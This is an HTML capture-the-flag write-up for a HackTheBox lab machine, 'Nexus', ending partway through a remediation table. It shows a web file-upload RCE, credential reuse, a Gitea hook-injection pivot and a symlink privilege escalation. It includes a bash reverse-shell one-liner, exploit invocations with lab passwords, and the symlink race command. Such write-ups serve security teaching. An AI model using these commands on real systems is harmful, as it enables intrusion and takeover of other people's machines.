@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Nexus - HackTheBox writeup</title>
+<meta name="description" content="HackTheBox Nexus (Easy): Krayin CRM authenticated file-upload RCE, credential reuse to lateral move, Gitea CVE-2026-60004 hook injection for a second pivot, and a root-run systemd timer exploited via symlink attack.">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="nav"><div class="wrap">
+  <a class="brand" href="index.html">~/sudoanthony</a>
+  <div class="links">
+    <a href="writeups.html">write-ups</a>
+    <a href="vulns.html">vulns</a>
+    <a href="concepts.html">concepts</a>
+    <a href="tools.html">tools</a>
+    <a href="https://github.com/sudoanthony">github</a>
+  </div>
+</div></nav>
+
+<main class="wrap" style="padding-top:44px">
+
+  <h1>Nexus</h1>
+
+  <div class="meta">
+    <span class="badge htb">HackTheBox</span>
+    <span class="badge easy">Easy</span>
+    <span class="badge red-team">red team</span>
+    <span class="sep">|</span>
+    <span>Linux &middot; web</span>
+    <span class="sep">|</span>
+    <span>14 Sep 2026</span>
+  </div>
+
+  <div class="tldr">
+    <span class="lbl">tl;dr</span>
+    <p>A Krayin CRM authenticated file-upload RCE gets a shell as <code>www-data</code>. The app's
+    <code>.env</code> holds a database password that is reused by <code>jones</code> for SSH. An
+    internal Gitea instance is exposed via SSH port-forwarding; the running version is vulnerable to
+    CVE-2026-60004, a diffpatch git-hook injection that runs code as the <code>git</code> OS user.
+    As <code>git</code>, a root-owned systemd timer that syncs Gitea template repos is turned against
+    itself with a symlink: the script follows the link and writes a controlled file into
+    <code>/root/.ssh/</code>, placing a public key there and allowing a direct SSH login as root.</p>
+  </div>
+
+  <div class="tags">
+    <a class="tag" href="vulns.html#file-upload-rce">file-upload-rce</a>
+    <a class="tag" href="vulns.html#exposed-credentials">exposed-credentials</a>
+    <a class="tag" href="vulns.html#gitea-hook-rce">gitea-hook-rce</a>
+    <a class="tag" href="vulns.html#symlink-write">symlink-write</a>
+    <a class="tag" href="vulns.html#priv-esc">priv-esc</a>
+  </div>
+
+  <p style="margin-top:26px; color:var(--text-2);">
+    Nexus chains four distinct techniques together, and none of them need a brute-force. The chain
+    is methodical: each foothold hands you exactly one credential or capability, and you spend the
+    box figuring out where to use it next. Good practice for the habit of taking notes and always
+    asking "where else could this work?"
+  </p>
+
+  <hr>
+
+  <!-- ==================== 01 ==================== -->
+  <h2><span class="num">01</span>Recon &amp; Enumeration</h2>
+
+  <p>Starting with an Nmap scan to see what we are working with:</p>
+
+  <pre><code><span class="p">$</span> nmap -sC -sV -T4 <span class="o">&lt;IP&gt;</span></code></pre>
+
+  <p>Two open ports come back: 22 (SSH) and 80 (HTTP). The HTTP response also reveals the domain name
+  <code>nexus.htb</code>. Whenever I see port 22, I like to quickly rule out anonymous SSH access before
+  moving on.</p>
+
+  <figure><img src="screenshots/Nexus/nexus2.png" alt="SSH anonymous login check - access denied"><figcaption>SSH anonymous login ruled out with a few basic passwords</figcaption></figure>
+
+  <p>After confirming SSH won't let us in without real credentials, port 80 is the more interesting
+  target. Add <code>nexus.htb</code> to <code>/etc/hosts</code> first.</p>
+
+  <figure><img src="screenshots/Nexus/nexus3.png" alt="nexus.htb homepage - Nexus Energy Authority"><figcaption>The homepage: a company website for Nexus Energy Authority</figcaption></figure>
+
+  <p>The site presents itself as a Nexus Energy Authority — news, information, the usual corporate
+  front page. Click through everything, check Wappalyzer, and read the source. A job posting linked
+  from the site has a couple of useful details buried at the bottom.</p>
+
+  <figure><img src="screenshots/Nexus/nexus4.png" alt="Job posting on nexus.htb"><figcaption>The job posting — worth reading all the way to the bottom</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus5.png" alt="Job posting footer with hiring manager contact and subdomain hint"><figcaption>Hiring manager contact (<code>j.matthew@nexus.htb</code>) and the subdomain hint <code>careers.nexus.htb</code></figcaption></figure>
+
+  <p>Two things worth noting: a hiring manager's email address <code>j.matthew@nexus.htb</code>, and
+  a subdomain <code>careers.nexus.htb</code>. The subdomain just redirects back to the main site even
+  after adding it to <code>/etc/hosts</code>, but its existence is a hint that <em>other</em> subdomains
+  might actually go somewhere. Write down the email — it looks like a login credential waiting to be
+  paired with a password we haven't found yet.</p>
+
+  <hr>
+
+  <!-- ==================== 02 ==================== -->
+  <h2><span class="num">02</span>Directory &amp; Subdomain Discovery</h2>
+
+  <h3>Directory scan</h3>
+
+  <pre><code><span class="p">$</span> gobuster dir -u http://10.129.234.54 \
+    -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+    -t 50 -x php,html,txt,bak --exclude-length 154</code></pre>
+
+  <p>A quick breakdown of the flags used here:</p>
+  <ul>
+    <li><code>dir</code> — brute-force directories and files by appending each wordlist entry to the URL.</li>
+    <li><code>-t 50</code> — 50 parallel threads. Faster, but louder. Fine for a lab, tune down if stealth matters.</li>
+    <li><code>-x php,html,txt,bak</code> — try each word with these extensions too. Match the extension set to the tech stack you identified.</li>
+    <li><code>--exclude-length 154</code> — hides responses of exactly 154 bytes (the catch-all 302 redirect), so only genuinely different pages appear.</li>
+    <li>You can also add <code>-o results.txt</code> to save output for your notes.</li>
+  </ul>
+
+  <figure><img src="screenshots/Nexus/nexus6.png" alt="Gobuster directory scan - no significant findings"><figcaption>Directory scan finishes without notable results — time to try virtual hosts</figcaption></figure>
+
+  <p>Nothing interesting on the path side, so let's hunt for subdomains since we already have reason
+  to believe they exist.</p>
+
+  <h3>Virtual host / subdomain scan</h3>
+
+  <pre><code><span class="p">$</span> gobuster vhost -u http://nexus.htb \
+    -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+    --append-domain -t 50</code></pre>
+
+  <p>Key flags here:</p>
+  <ul>
+    <li><code>vhost</code> — changes the <code>Host:</code> header on each request instead of the path, discovering sites served off the same IP.</li>
+    <li><code>--append-domain</code> — appends the base domain so each word becomes <code>word.nexus.htb</code>. Required on modern Gobuster, or it sends bare words.</li>
+  </ul>
+
+  <figure><img src="screenshots/Nexus/nexus7.png" alt="Gobuster vhost scan results showing git.nexus.htb and billing.nexus.htb"><figcaption>Two hits: <code>git.nexus.htb</code> and <code>billing.nexus.htb</code> with a path of <code>/admin/login</code></figcaption></figure>
+
+  <p>Two new subdomains: <code>git.nexus.htb</code> and <code>billing.nexus.htb</code>. Add them both to
+  <code>/etc/hosts</code> and investigate.</p>
+
+  <figure><img src="screenshots/Nexus/nexus8.png" alt="/etc/hosts with all three subdomains added"><figcaption><code>/etc/hosts</code> updated with all discovered hostnames</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 03 ==================== -->
+  <h2><span class="num">03</span>Source code recon &mdash; <code>git.nexus.htb</code></h2>
+
+  <figure><img src="screenshots/Nexus/nexus9.png" alt="git.nexus.htb - Gitea landing page"><figcaption><code>git.nexus.htb</code> runs a Gitea instance</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus10.png" alt="Gitea repo list showing admin/krayin-docker-setup"><figcaption>A public repo owned by admin: a Docker setup for Krayin CRM</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus11.png" alt="Contents of the krayin-docker-setup repository"><figcaption>Inside the repo: <code>.env</code>, <code>docker-compose.yml</code>, and a <code>Documents</code> folder</figcaption></figure>
+
+  <p>A code repository is essentially the blueprint of an application. Even if the deployed app is
+  locked down, the blueprint shows you every door, window, and sometimes a few things that should have
+  stayed in the developer's private workspace (secret doors, so to speak).</p>
+
+  <p>What is Krayin? It's an open-source Customer Relationship Management (CRM) app built on Laravel,
+  a popular PHP framework. The repo here is a Docker deployment configuration for running an instance
+  of it. If you don't recognize an app, Google it — that's how you find default credentials, known CVEs,
+  or default login paths for something you've never seen before.</p>
+
+  <p>Three files in the repo stand out:</p>
+  <ul>
+    <li><strong><code>Documents</code></strong> — a folder created by a human, which means it can hold anything they thought worth saving.</li>
+    <li><strong><code>docker-compose.yml</code></strong> — lists every service, exposed port, and environment variable. Sometimes DB credentials land here inline.</li>
+    <li><strong><code>.env</code></strong> — a plaintext config file that apps read at startup. <em>This should never be committed to a public repo.</em></li>
+  </ul>
+
+  <figure><img src="screenshots/Nexus/nexus12.png" alt=".env file contents showing various configuration values"><figcaption>The <code>.env</code> file — a goldmine of configuration details</figcaption></figure>
+
+  <p>Interesting values from <code>.env</code>:</p>
+  <ul>
+    <li><code>billing.nexus.htb</code> — confirms the subdomain we already found.</li>
+    <li><code>imap.nexus.htb</code> — another hostname to explore later.</li>
+    <li><code>IMAP_USERNAME=username1</code> / <code>IMAP_PASSWORD=password1</code> — very generic, but note them.</li>
+    <li><code>APP_DEBUG=true</code> / <code>APP_ENV=local</code> — debug mode exposed in production. Not our attack vector here, but a real finding.</li>
+    <li><code>DB_PASSWORD=</code> — empty right now, but the key is we know <em>it exists</em>.</li>
+  </ul>
+
+  <figure><img src="screenshots/Nexus/nexus14.png" alt="docker-compose.yml contents"><figcaption><code>docker-compose.yml</code> — confirms the service architecture</figcaption></figure>
+
+  <p>The compose file shows <code>krayin-phpmyadmin</code> on port 8080, the DB password pulled from
+  <code>${DB_PASSWORD}</code> (meaning it lives in <code>.env</code>), and the Krayin app on port 80.
+  The DB host is internal to the container network, so we can't reach MySQL directly from outside —
+  but knowing the username <code>krayin</code> is useful.</p>
+
+  <h3>Git commit history</h3>
+
+  <p>Git stores every past version of every file. Even deleted content lives in old commits.
+  Tools like <code>trufflehog</code> or <code>gitleaks</code> can automate hunting for leaked secrets
+  across an entire history — very useful when you're dealing with large repos. Here we can do it
+  manually because there aren't many commits.</p>
+
+  <figure><img src="screenshots/Nexus/nexus13.png" alt="Gitea commit history showing two commits"><figcaption>Two commits — the diff between them is what we care about</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus15.png" alt="Commit diff showing removed DB password N27xh!!2ucY04"><figcaption>The diff: a database password was removed in the latest commit — and changed URL from <code>nexus.htb</code> to <code>billing.nexus.htb</code></figcaption></figure>
+
+  <p>The color coding tells the story: green lines were added, red lines were removed. The previous
+  commit had a real <code>DB_PASSWORD</code> — <code>N27xh!!2ucY04</code> — that someone then deleted
+  to "clean up" the repo. Too late. We also see the URL was changed from <code>nexus.htb</code> to
+  <code>billing.nexus.htb</code> in the same commit. Note all of this and move on.</p>
+
+  <hr>
+
+  <!-- ==================== 04 ==================== -->
+  <h2><span class="num">04</span>Foothold &mdash; Krayin CRM RCE</h2>
+
+  <figure><img src="screenshots/Nexus/nexus16.png" alt="billing.nexus.htb login page"><figcaption><code>billing.nexus.htb</code> — a Krayin login page asking for email and password</figcaption></figure>
+
+  <p>The login page wants an email and a password. We have a candidate for each: <code>j.matthew@nexus.htb</code>
+  from the job posting, and the DB password <code>N27xh!!2ucY04</code> from the commit history. This
+  is the moment where having taken notes pays off — the email was found several steps ago in a completely
+  different context.</p>
+
+  <figure><img src="screenshots/Nexus/nexus17.png" alt="Krayin CRM dashboard after successful login"><figcaption>Login success — we're inside the Krayin CRM dashboard</figcaption></figure>
+
+  <p>We're logged in as what appears to be an admin user. Let's find the version of Krayin we're
+  running and look for known vulnerabilities.</p>
+
+  <figure><img src="screenshots/Nexus/nexus18.png" alt="Krayin version 2.2.0 shown in profile area"><figcaption>Krayin 2.2.0 — visible from the profile dropdown</figcaption></figure>
+
+  <p>A search for <code>Krayin 2.2.0 CVE</code> quickly turns up
+  <a href="https://www.exploit-db.com/exploits/52629" target="_blank">Exploit-DB 52629</a>: an
+  authenticated file-upload RCE through the TinyMCE image upload handler.</p>
+
+  <div class="note insight">
+    <span class="lbl">how the exploit works</span>
+    Krayin's text editor (TinyMCE) has an image-upload feature. The upload handler checks the file's
+    stated MIME type rather than its actual content, so a PHP web shell labeled <code>image/jpeg</code>
+    slips straight through. The file is saved to a web-accessible path, and visiting it makes the server
+    execute our code. The script handles CSRF tokens automatically — it scrapes the login page for a
+    hidden <code>_token</code> field, logs in, and reuses the same session for the upload. Think of it
+    as letting a lion into the monkey exhibit because it's wearing a lanyard that says "Monkey."
+  </div>
+
+  <p>We need a reverse shell to go with the exploit. A classic choice is
+  <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">pentestmonkey's PHP reverse shell</a> —
+  edit the <code>$ip</code> and <code>$port</code> variables to your <code>tun0</code> IP and a port
+  of your choice, then save it as <code>reverse.php</code>. Set up the listener first:</p>
+
+  <pre><code><span class="p">$</span> nc -lvnp 4444</code></pre>
+
+  <p>Then run the exploit. Note: the password contains <code>!!</code> which bash expands as history
+  — single-quote the password to stop that:</p>
+
+  <pre><code><span class="p">$</span> python3 exploit.py http://billing.nexus.htb j.matthew@nexus.htb 'N27xh!!2ucY04' reverse.php</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus19.png" alt="Exploit script output confirming upload success and file path"><figcaption>The exploit reports success and gives us the path to our shell</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus20.png" alt="Reverse shell caught by nc listener as www-data"><figcaption>Shell caught — we are <code>www-data</code>. Shell upgraded with <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> and <code>export TERM=xterm</code></figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 05 ==================== -->
+  <h2><span class="num">05</span>Lateral movement &mdash; <code>www-data</code> &rarr; <code>jones</code></h2>
+
+  <p>First, figure out who we are and what we have access to:</p>
+
+  <figure><img src="screenshots/Nexus/nexus21.png" alt="ls /home showing jones and git directories, both permission denied"><figcaption>Two home directories — <code>/home/jones</code> and <code>/home/git</code> — both off-limits for now</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus22.png" alt="id output showing www-data uid=33"><figcaption><code>id</code> — we are the web server user <code>www-data</code></figcaption></figure>
+
+  <p>As <code>www-data</code>, we have access to the web application's files — specifically
+  <code>/var/www/</code>. That's exactly where a Laravel app's <code>.env</code> would live, and
+  unlike the version in the public git repo, the one on disk is the real running configuration:</p>
+
+  <figure><img src="screenshots/Nexus/nexus23.png" alt="ls /var/www showing krayin directory"><figcaption><code>/var/www/krayin</code> — the live app directory</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus24.png" alt="ls -la /var/www/krayin showing .env file"><figcaption><code>.env</code> is right there</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus25.png" alt=".env file on disk with real DB_PASSWORD y27xb3ha!!74GbR"><figcaption>The live <code>.env</code> has a real DB password: <code>y27xb3ha!!74GbR</code></figcaption></figure>
+
+  <p>Interesting — the password in the running app's <code>.env</code> is <em>different</em> from the one
+  in the git history. That's fine: we have two passwords now. The more useful question is whether
+  either one has been reused as a system login password. Let's check which users can actually log in:</p>
+
+  <pre><code><span class="p">$</span> cat /etc/passwd | grep -v nologin | grep -v false</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus26.png" alt="passwd output showing root, sync, jones, git"><figcaption>Login-capable users: <code>root</code>, <code>sync</code>, <code>jones</code>, <code>git</code></figcaption></figure>
+
+  <p>Try <code>jones</code> first with the live <code>.env</code> password. Single-quote it again because
+  of the <code>!</code> characters:</p>
+
+  <pre><code><span class="p">$</span> su jones      <span class="c"># password: y27xb3ha!!74GbR (single-quoted at the prompt)</span></code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus27.png" alt="su jones succeeds, shell prompt changes to jones@nexus"><figcaption>Password reuse confirmed — we are now <code>jones</code></figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus28.png" alt="cat user.txt showing redacted flag value"><figcaption>User flag — <code>/home/jones/user.txt</code> [redacted]</figcaption></figure>
+
+  <p>SSH in as <code>jones</code> for a stable shell before going further:</p>
+
+  <pre><code><span class="p">$</span> ssh jones@nexus.htb      <span class="c"># same password</span></code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus29.png" alt="SSH login as jones succeeds"><figcaption>Stable SSH session as <code>jones</code></figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 06 ==================== -->
+  <h2><span class="num">06</span>Internal service discovery &mdash; Gitea on port 3000</h2>
+
+  <p>Standard checks as <code>jones</code>:</p>
+
+  <figure><img src="screenshots/Nexus/nexus30.png" alt="sudo -l blank, id showing jones groups, find SUID showing only defaults"><figcaption><code>sudo -l</code> blank, no interesting groups, SUID binaries are all default — nothing obvious here</figcaption></figure>
+
+  <p>No immediate escalation path from <code>jones</code>. Let's look at what's running on the machine
+  that isn't visible from the outside:</p>
+
+  <pre><code><span class="p">$</span> ss -tlnp</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus31.png" alt="ss -tlnp output with port 3000 on 127.0.0.1 highlighted"><figcaption>Port 3000 is listening on <code>127.0.0.1</code> only — invisible from outside, but accessible from inside the box</figcaption></figure>
+
+  <p>The public-facing ports (<code>0.0.0.0:22</code> and <code>0.0.0.0:80</code>) we already knew
+  about. Port 3000 bound to <code>127.0.0.1</code> is new — that's the default Gitea port. Remember
+  the <code>git</code> user we saw in <code>/home/</code>? These two facts belong together.
+  Port 3306/33060 is MySQL and port 53 is DNS — ignore those for now.</p>
+
+  <h3>SSH local port forwarding</h3>
+
+  <p>To browse an internal web service, we tunnel it out through our existing SSH connection. Run
+  this <em>from your attack box</em> (not from inside the target):</p>
+
+  <pre><code><span class="p">$</span> ssh -L 3000:127.0.0.1:3000 jones@&lt;TARGET_IP&gt;</code></pre>
+
+  <p><code>-L 3000:127.0.0.1:3000</code> tells SSH to open port 3000 on your local machine and
+  forward anything that hits it through the tunnel to <code>127.0.0.1:3000</code> on the target.
+  Now browsing <code>http://127.0.0.1:3000</code> on your own machine shows the internal Gitea.</p>
+
+  <figure><img src="screenshots/Nexus/nexus32.png" alt="Internal Gitea accessible at 127.0.0.1:3000"><figcaption>Internal Gitea — same repos and content as the public-facing one, but we can log in here</figcaption></figure>
+
+  <p>Login as <code>jones</code> with the same password:</p>
+
+  <figure><img src="screenshots/Nexus/nexus33.png" alt="Gitea login form"><figcaption>Logging in as jones on the internal instance</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus34.png" alt="Gitea dashboard after login as jones showing full name J. Matthews"><figcaption>The "j" in <code>j.matthew@nexus.htb</code> was for J. Matthews — maybe you noticed that already</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus35.png" alt="Gitea admin user profile showing admin@nexus.htb"><figcaption>Extra buttons available now, admin email visible. The Gitea version is in the bottom-left corner.</figcaption></figure>
+
+  <p>Clicking around doesn't turn up anything dramatically new in the repo content. But that version
+  number in the corner is a sore thumb. A quick search for Gitea CVEs for this version brings up
+  <a href="https://socprime.com/blog/cve-2026-60004-critical-gitea-rce-exploited-to-deploy-miner-like-payloads/" target="_blank">CVE-2026-60004</a>.</p>
+
+  <div class="note insight">
+    <span class="lbl">CVE-2026-60004 — Gitea diffpatch git-hook RCE</span>
+    The vulnerability lives in Gitea's <code>diffpatch</code> endpoint. A user with ordinary repository
+    write access can smuggle attacker-controlled content into a git hook. Server-side hooks fire on
+    receive/commit events and run as the Gitea service account — in this case, the <code>git</code>
+    OS user. We don't need to push from a local git client; the exploit drives everything through the
+    web API. See the advisory at
+    <a href="https://github.com/go-gitea/gitea/security/advisories/GHSA-rcr6-4jqh-j84m" target="_blank">GHSA-rcr6-4jqh-j84m</a>.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 07 ==================== -->
+  <h2><span class="num">07</span>Pivot &mdash; <code>jones</code> &rarr; <code>git</code> (CVE-2026-60004)</h2>
+
+  <p>Create a repository in Gitea (the web UI will do — just click the <code>+</code> icon).</p>
+
+  <figure><img src="screenshots/Nexus/nexus36.png" alt="Creating a new Gitea repository as jones"><figcaption>Creating a repo in Gitea as jones — this will be our payload vehicle</figcaption></figure>
+
+  <p>Build the PoC script from the advisory, then run it. Make sure the SSH tunnel is still open
+  and the listener is ready before firing:</p>
+
+  <pre><code><span class="c"># 1. Listener on your attack box</span>
+<span class="p">$</span> nc -lvnp 4444
+
+<span class="c"># 2. Run the exploit (through the tunnel)</span>
+<span class="p">$</span> python3 poc.py http://127.0.0.1:3000 jones \
+    "bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;YOUR_TUN0_IP&gt;/4444 0&gt;&amp;1'"</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus37.png" alt="Three-pane view: exploit script running, listener catching shell as git, ssh tunnel confirmation"><figcaption>Top-left: listener catches the shell. Middle: exploit script output. Top-right: SSH tunnel still running.</figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus38.png" alt="Shell stabilized as git user"><figcaption>We are now <code>git</code>. Stabilize the shell the same way as before.</figcaption></figure>
+
+  <pre><code><span class="p">$</span> python3 -c 'import pty; pty.spawn("/bin/bash")'
+<span class="p">$</span> export TERM=xterm</code></pre>
+
+  <hr>
+
+  <!-- ==================== 08 ==================== -->
+  <h2><span class="num">08</span>Post-exploitation as <code>git</code> &mdash; container check &amp; custom scripts</h2>
+
+  <p>Three standard checks as <code>git</code> — <code>id</code>, <code>sudo -l</code>, and SUID
+  binaries — all come back the same as <code>jones</code>: nothing unusual. Before doing anything
+  else, confirm we are on a real host and not inside a container, because that changes what "root"
+  even means:</p>
+
+  <pre><code><span class="p">$</span> ls -la /.dockerenv
+<span class="p">$</span> cat /proc/1/cgroup</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus39.png" alt="No .dockerenv, cgroup shows 0::/init.scope - real host confirmed. /etc/gitea listing shows template-sync.py and template-sync.conf"><figcaption>No container. PID 1 is systemd on a real host — root here is real root. Also: non-standard files in <code>/etc/gitea</code>.</figcaption></figure>
+
+  <p>No <code>/.dockerenv</code>, and <code>/proc/1/cgroup</code> showing <code>0::/init.scope</code>
+  means PID 1 is systemd on a bare host. Root is real root. We don't need to escape anything.</p>
+
+  <p>Inside <code>/etc/gitea</code> we also find two files that don't ship with any standard Gitea
+  installation: <code>template-sync.py</code> and <code>template-sync.conf</code>. These are custom
+  additions. Let's read them.</p>
+
+  <p>The Python script (<code>template-sync.py</code>) reads Gitea template repositories via the
+  API and extracts their files into a staging directory on disk:</p>
+
+  <pre><code>STAGING_DIR = "/home/git/template-staging"
+
+<span class="c"># For each file in each template repo, it does:</span>
+os.makedirs(target_dir, exist_ok=True)   <span class="c"># creates the path if missing</span>
+<span class="c"># ...then writes the file content there</span>
+
+<span class="c"># Full destination path pattern:</span>
+<span class="c"># /home/git/template-staging/&lt;owner&gt;/&lt;reponame_lowercased&gt;/&lt;filepath&gt;</span></code></pre>
+
+  <p>The <code>.conf</code> file holds a Gitea API token (redacted here — don't publish yours either).</p>
+
+  <div class="note warn">
+    <span class="lbl">why this matters</span>
+    We own <code>/home/git</code> as the <code>git</code> user. The script is going to write files to
+    paths inside that directory — paths <em>we</em> can control the shape of before the script runs.
+    If we can redirect where those writes land, we can write files anywhere on the system that root
+    can reach.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 09 ==================== -->
+  <h2><span class="num">09</span>Scheduled jobs &mdash; finding the root timer</h2>
+
+  <p>A custom script that does file writes is interesting, but only if it runs with elevated privileges.
+  Let's check what runs automatically and as whom. Check both cron and systemd timers — both can schedule
+  root jobs:</p>
+
+  <pre><code><span class="c"># System-wide crontab + any cron.d entries</span>
+<span class="p">$</span> cat /etc/crontab; ls -la /etc/cron.d/ 2>/dev/null
+
+<span class="c"># Find what references our script in systemd</span>
+<span class="p">$</span> grep -rn 'template-sync' /etc/systemd /etc/cron* 2>/dev/null</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus41.png" alt="grep output showing ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py in gitea-template-sync.service"><figcaption><code>ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py</code> — no <code>User=</code> line means it runs as root</figcaption></figure>
+
+  <pre><code><span class="p">$</span> systemctl list-timers --all 2>/dev/null</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus40.png" alt="systemctl list-timers showing gitea-template-sync.timer firing every ~60 seconds"><figcaption><code>gitea-template-sync.timer</code> — fires roughly every 60 seconds</figcaption></figure>
+
+  <p>The crontab came back clean (nothing custom there). The systemd unit, however, runs
+  <code>template-sync.py</code> as root every ~60 seconds with no <code>User=</code> directive — meaning
+  it inherits root from the service manager. We have a root-owned script writing files into a directory
+  we control, on a 60-second loop.</p>
+
+  <hr>
+
+  <!-- ==================== 10 ==================== -->
+  <h2><span class="num">10</span>Privilege escalation &mdash; symlink attack &rarr; root</h2>
+
+  <h3>The primitive</h3>
+
+  <p>A symlink is just a file that points to another path. When a program opens
+  <code>/home/git/template-staging/jones/test/authorized_keys</code> and <code>test</code> is actually
+  a symlink pointing to <code>/root/.ssh</code>, the program writes to
+  <code>/root/.ssh/authorized_keys</code> — it follows the link without question.</p>
+
+  <p>The script runs as root and writes to <code>/home/git/template-staging/&lt;owner&gt;/&lt;name&gt;/&lt;file&gt;</code>.
+  We own the parent directory. If we pre-create the <code>&lt;name&gt;</code> segment as a symlink pointing
+  to <code>/root/.ssh</code>, root's script will write our file into that root-only location for us.</p>
+
+  <h3>Step 1 — Generate an SSH keypair on your attack box</h3>
+
+  <pre><code><span class="p">$</span> ssh-keygen -f ./nexus_key</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus42.png" alt="ssh-keygen generating nexus_key and nexus_key.pub"><figcaption>Two files: <code>nexus_key</code> (private, keep it) and <code>nexus_key.pub</code> (public, this goes into the repo)</figcaption></figure>
+
+  <h3>Step 2 — Create a template repo in Gitea with an <code>authorized_keys</code> file</h3>
+
+  <p>Create a new repo in Gitea as <code>jones</code>. Add a file named exactly <code>authorized_keys</code>
+  containing the contents of your <code>nexus_key.pub</code>. Commit it to <code>main</code>.</p>
+
+  <figure><img src="screenshots/Nexus/nexus43.png" alt="Creating the authorized_keys file in the Gitea repo"><figcaption>Adding the public key as <code>authorized_keys</code></figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus44.png" alt="Public key content pasted into the file editor"><figcaption>Public key content — paste the full line from <code>nexus_key.pub</code></figcaption></figure>
+  <figure><img src="screenshots/Nexus/nexus45.png" alt="Gitea repo settings with Template checkbox enabled"><figcaption>Mark the repo as a Template in Settings — the sync script only processes template repos</figcaption></figure>
+
+  <p>The script lowercases the repo name when building the staging path. A repo named <code>Test</code>
+  becomes <code>test</code>, so the staging path becomes
+  <code>/home/git/template-staging/jones/test</code>. That's the path we need to control.</p>
+
+  <h3>Step 3 — Plant the symlink (race the timer)</h3>
+
+  <p>If the timer has already fired, it may have created <code>/home/git/template-staging/jones/test/</code>
+  as a root-owned directory, which would block our symlink. The fix: move the whole staging tree aside
+  (we own <code>/home/git</code>, so we can rename things there), then recreate the path cleanly and
+  drop our symlink. Do this in one line to minimize the race window:</p>
+
+  <pre><code><span class="p">$</span> mv /home/git/template-staging /home/git/template-staging.bak \
+    &amp;&amp; mkdir -p /home/git/template-staging/jones \
+    &amp;&amp; ln -s /root/.ssh /home/git/template-staging/jones/test</code></pre>
+
+  <h3>Step 4 — Verify the symlink</h3>
+
+  <pre><code><span class="p">$</span> ls -la /home/git/template-staging/jones/</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus47.png" alt="ls showing test -> /root/.ssh symlink in place"><figcaption><code>test -&gt; /root/.ssh</code> — the symlink is correctly in place</figcaption></figure>
+
+  <h3>Step 5 — Wait for the timer and check the log</h3>
+
+  <pre><code><span class="p">$</span> cat /var/log/template-sync.log</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus46.png" alt="template-sync.log showing synced: authorized_keys for jones/Test"><figcaption>Log confirms the sync ran and wrote <code>authorized_keys</code> through our symlink</figcaption></figure>
+
+  <p>The log line <code>synced: authorized_keys</code> under <code>jones/Test</code> means root just
+  wrote our public key into <code>/root/.ssh/authorized_keys</code>.</p>
+
+  <h3>Step 6 — SSH in as root</h3>
+
+  <pre><code><span class="p">$</span> ssh -i nexus_key root@&lt;TARGET_IP&gt;</code></pre>
+
+  <figure><img src="screenshots/Nexus/nexus48.png" alt="SSH login as root succeeds, root.txt flag visible"><figcaption>Root shell. <code>/root/root.txt</code> — [redacted]</figcaption></figure>
+
+  <hr>
+
+  <!-- ==================== 11 ==================== -->
+  <h2><span class="num">11</span>Root cause &amp; remediation</h2>
+
+  <table style="width:100%; border-collapse:collapse; font-size:14.5px; margin:6px 0 8px">
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text); width:40%"><strong>Unsafe file upload (Krayin)</strong><br><span style="color:var(--text-4);font-size:13px">CVE-2026-38526 / TinyMCE upload handler</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Validate file content (magic bytes), not just the MIME label. Store uploads outside the webroot, or serve them through a handler that sets a non-executable content type. Never execute uploaded files.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Secrets in version control</strong><br><span style="color:var(--text-4);font-size:13px">Deleted credentials still live in git history</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Rotate any credential that ever touched a commit. Treat git history as permanent public record — deletion does not remove data from prior commits. Use <code>.gitignore</code> and pre-commit hooks to block secrets before they land.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Password reuse across services</strong><br><span style="color:var(--text-4);font-size:13px">One DB password opened SSH, Gitea, and more</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Unique, random credentials per service. A single compromised secret should not cascade across multiple accounts and systems.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Gitea diffpatch hook RCE</strong><br><span style="color:var(--text-4);font-size:13px">CVE-2026-60004 — patched in 1.27.1</span></td>
